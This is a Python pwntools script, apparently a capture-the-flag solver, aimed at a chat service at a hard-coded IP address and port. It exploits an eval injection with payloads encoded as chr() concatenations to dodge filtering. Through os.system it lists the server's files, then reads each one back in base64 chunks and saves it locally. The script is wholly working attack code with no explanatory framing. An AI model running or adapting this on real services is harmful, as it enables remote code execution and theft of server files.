python
from pwn import *
import base64
import sys

def convertstr(convert, debug=False):
	if debug:
		print convert
	output = ""
	for i in convert:
		output+= "chr(%d)+" % ord(i)
	return output[:-1]

if len(sys.argv) == 2 and sys.argv[1] == "local":
	r = remote("0.0.0.0",2000)
else:
	r = remote("199.247.6.180",14000)

for i in range(5):
	r.readuntil("<You>:")
	r.sendline("1")


def dump():
	payload_search = convertstr("__import__('os').system('find -follow')")
	r.sendline("eval(%s)"%payload_search)
	r.readuntil("Krampus>: ")
	skip = ["./server.jar"]
	lines = r.readuntil("You>: ")[:-10].splitlines()
	print "Found %d files" % len(lines)
	for f in lines:
		print "Downloading file %s" % f
		if f in skip:
			print "Banned file... Skipping"
			continue
		if os.path.isfile("./minecraft/%s" % f):
			print "File already downloaded..."
			continue
		payloadchunksize = convertstr("__import__('os').system('cat ./%s | base64 -w 0 | wc -c')" % f)
		r.sendline("eval(%s)"%payloadchunksize)

		r.readuntil("Krampus>: ")

		chunk_size = (r.readuntil("You>: ")[:-9])
		print "SIZE: %s" % chunk_size
		if "Krampus stares back" in chunk_size:
			print "Found directory..."
			dirpath = "./minecraft/%s" % f
			if not os.path.exists(dirpath):
				os.mkdir(dirpath)
				print "Directory created"
			continue
		else:
			chunk_size = int(chunk_size)
		#This is the ugliest code i have ever seen. That's right. I wonder who wrote it
		chunk_ = range(1, chunk_size+1)
		n = 50000
		output = [chunk_[i:i+n] for i in range(0, len(chunk_), n)]
		print "Size of file is %d lines" % chunk_size
		counter = 1
		data = ""
		for i in output:
			diff = (i[-1]-i[0])+1
			print "Processing chunk [%d of %d]" % (counter,chunk_size)
			high = counter+diff
			payload = convertstr("__import__('os').system('cat %s | base64 -w 0 | cut -c%d-%d && echo stop')" % (f, counter,high))
			counter += diff+1
			r.sendline("eval(%s)" % payload)
			r.readuntil("Krampus>: ")
			data += r.readuntil("stop")[:-5]
		data = base64.b64decode(data)
		with open('minecraft/%s' % f, 'w') as the_file:
			the_file.write(data)
dump()
r.close